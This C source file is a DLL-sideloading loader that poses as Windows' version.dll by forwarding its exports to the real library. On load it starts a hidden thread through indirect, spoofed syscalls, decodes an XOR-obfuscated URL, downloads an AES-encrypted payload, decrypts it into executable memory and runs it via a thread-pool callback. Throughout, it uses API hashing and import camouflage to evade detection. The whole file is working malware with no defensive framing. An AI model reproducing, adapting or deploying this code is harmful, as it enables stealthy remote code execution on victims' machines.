#include "Common.h"
#include "ctaes.h"
#include "IatCamouflage.h"

#pragma comment(linker,"/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA,@1")
#pragma comment(linker,"/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.GetFileVersionInfoByHandle,@2")
#pragma comment(linker,"/export:GetFileVersionInfoExA=C:\\Windows\\System32\\version.GetFileVersionInfoExA,@3")
#pragma comment(linker,"/export:GetFileVersionInfoExW=C:\\Windows\\System32\\version.GetFileVersionInfoExW,@4")
#pragma comment(linker,"/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeA,@5")
#pragma comment(linker,"/export:GetFileVersionInfoSizeExA=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker,"/export:GetFileVersionInfoSizeExW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker,"/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.GetFileVersionInfoSizeW,@8")
#pragma comment(linker,"/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.GetFileVersionInfoW,@9")
#pragma comment(linker,"/export:VerFindFileA=C:\\Windows\\System32\\version.VerFindFileA,@10")
#pragma comment(linker,"/export:VerFindFileW=C:\\Windows\\System32\\version.VerFindFileW,@11")
#pragma comment(linker,"/export:VerInstallFileA=C:\\Windows\\System32\\version.VerInstallFileA,@12")
#pragma comment(linker,"/export:VerInstallFileW=C:\\Windows\\System32\\version.VerInstallFileW,@13")
#pragma comment(linker,"/export:VerLanguageNameA=C:\\Windows\\System32\\version.VerLanguageNameA,@14")
#pragma comment(linker,"/export:VerLanguageNameW=C:\\Windows\\System32\\version.VerLanguageNameW,@15")
#pragma comment(linker,"/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA,@16")
#pragma comment(linker,"/export:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW,@17")

API_HASHING g_Api = { 0 };
DWORD SyscallId = 0;
LPVOID spoofJump;
HMODULE hKernel32;
HMODULE hNtdll;

void FetchAesKeyAndIv(PBYTE ctAesKey, PBYTE ctAesIv) {

    for (int i = 0; i < IV_SIZE; i++) {
        ctAesIv[i] -= 0x03;
    }
    for (int i = 0; i < KEY_SIZE; i++) {
        ctAesKey[i] -= 0x03;
    }
    for (int i = 0; i < IV_SIZE; i++) {
        ctAesIv[i] ^= (BYTE)ctAesKey[0];
    }
    for (int i = 1; i < KEY_SIZE; i++) {
        for (int j = 0; j < IV_SIZE; j++) {
            ctAesKey[i] ^= (BYTE)ctAesIv[j];
        }
    }
}

void XorByInputKey(const LPCWSTR szString, LPWSTR szResult, const PBYTE bKey, const SIZE_T sKeySize) {

    size_t wStringSize = wcslen(szString);

    for (size_t i = 0, j = 0; i < wStringSize; i++, j++) {
        if (j >= sKeySize) {
            j = 0;
        }

        szResult[i] = szString[i] ^ bKey[j];
    }

    szResult[wStringSize] = L'\0';
}

int NewMain()
{
    IatCamouflage();

    hKernel32 = GetModuleHandleH(KERNEL32DLL_JOAA);

    g_Api.pCreateEventA = (fnCreateEventA)GetProcAddressH(hKernel32, CreateEventA_JOAA);
    HANDLE hEvent = g_Api.pCreateEventA(NULL, FALSE, FALSE, "vnfhslxmvnhrir");

    if (hEvent != NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }
    else {
        LPCWSTR szUrl = L"luwr>.,366-2*1-3+qb{hnbf*cjl";
        WCHAR szModifiedUrl[MAX_LENGTH];
        BYTE key[] = { 0x04, 0x01, 0x03, 0x02 };
        SIZE_T keySize = sizeof(key);

        PBYTE pPayloadBytes;
        SIZE_T sPayloadSize;

        PVOID ctPayload = NULL;
        PVOID ptPayload = NULL;
        DWORD dwptPayloadSize = NULL;
        BYTE ctAesKey[KEY_SIZE] = { 0 };
        BYTE ctAesIv[IV_SIZE] = { 0 };
        AES256_CBC_ctx	CtAesCtx = { 0 };

        LoadLibraryH("wininet");

        XorByInputKey(szUrl, szModifiedUrl, key, keySize);

        GetPayloadFromUrl((LPCWSTR)szModifiedUrl, &pPayloadBytes, &sPayloadSize);

        ctPayload = (PVOID)((ULONG_PTR)pPayloadBytes + KEY_SIZE + IV_SIZE);
        dwptPayloadSize = sPayloadSize - (KEY_SIZE + IV_SIZE);

        _memcpy(ctAesKey, pPayloadBytes, KEY_SIZE);
        _memcpy(ctAesIv, (PVOID)((ULONG_PTR)pPayloadBytes + KEY_SIZE), IV_SIZE);

        FetchAesKeyAndIv(ctAesKey, ctAesIv);

        AES256_CBC_init(&CtAesCtx, ctAesKey, ctAesIv);
        AES256_CBC_decrypt(&CtAesCtx, ctPayload, dwptPayloadSize, &ptPayload);

        HANDLE c = g_Api.pCreateEventA(NULL, FALSE, TRUE, NULL);

        LPVOID currentVmBase = NULL;
        SIZE_T szWmResv = dwptPayloadSize;

        GetSyscallId(hNtdll, &SyscallId, ZwAllocateVirtualMemory_JOAA);
        setup(SyscallId, spoofJump);
        NTSTATUS status = executioner((HANDLE)-1, &currentVmBase, NULL, &szWmResv, MEM_COMMIT, PAGE_READWRITE);

        _memcpy(currentVmBase, ptPayload, szWmResv);

        memset(ptPayload, '\0', dwptPayloadSize);
        memset(ctPayload, '\0', sizeof(ctPayload));
        memset(ctAesKey, '\0', KEY_SIZE);
        memset(ctAesIv, '\0', IV_SIZE);

        DWORD oldProt;
        GetSyscallId(hNtdll, &SyscallId, NtProtectVirtualMemory_JOAA);
        setup(SyscallId, spoofJump);
        status = executioner((HANDLE)-1, &currentVmBase, &szWmResv, PAGE_EXECUTE_READ, &oldProt);

        HANDLE hThread = NULL;
        g_Api.pTpAllocWait = (fnTpAllocWait)GetProcAddressH(hNtdll, TpAllocWait_JOAA);
        status = g_Api.pTpAllocWait((TP_WAIT**)&hThread, (PTP_WAIT_CALLBACK)currentVmBase, NULL, NULL);

        g_Api.pTpSetWait = (fnTpSetWait)GetProcAddressH(hNtdll, TpSetWait_JOAA);
        g_Api.pTpSetWait((TP_WAIT*)hThread, c, NULL);

        GetSyscallId(hNtdll, &SyscallId, NtWaitForSingleObject_JOAA);
        setup(SyscallId, spoofJump);
        status = executioner(c, 0, NULL);

        return 0;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    HANDLE hThread;

    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
        hNtdll = GetModuleHandleH(NTDLLDLL_JOAA);
        spoofJump = ((PCHAR)GetProcAddressH(hNtdll, NtAddBootEntry_JOAA)) + 18;
        GetSyscallId(hNtdll, &SyscallId, NtCreateThreadEx_JOAA);
        setup(SyscallId, spoofJump);
        executioner(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, NewMain, NULL, NULL, NULL, NULL, NULL, NULL);
        GetSyscallId(hNtdll, &SyscallId, NtClose_JOAA);
        setup(SyscallId, spoofJump);
        executioner(hThread);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

__declspec(dllexport) int SystemTest() {
    return 0;
}

__declspec(dllexport) int SystemInstaller() {
    return 0;
}

__declspec(dllexport) int InitializeSystem() {
    return 0;
}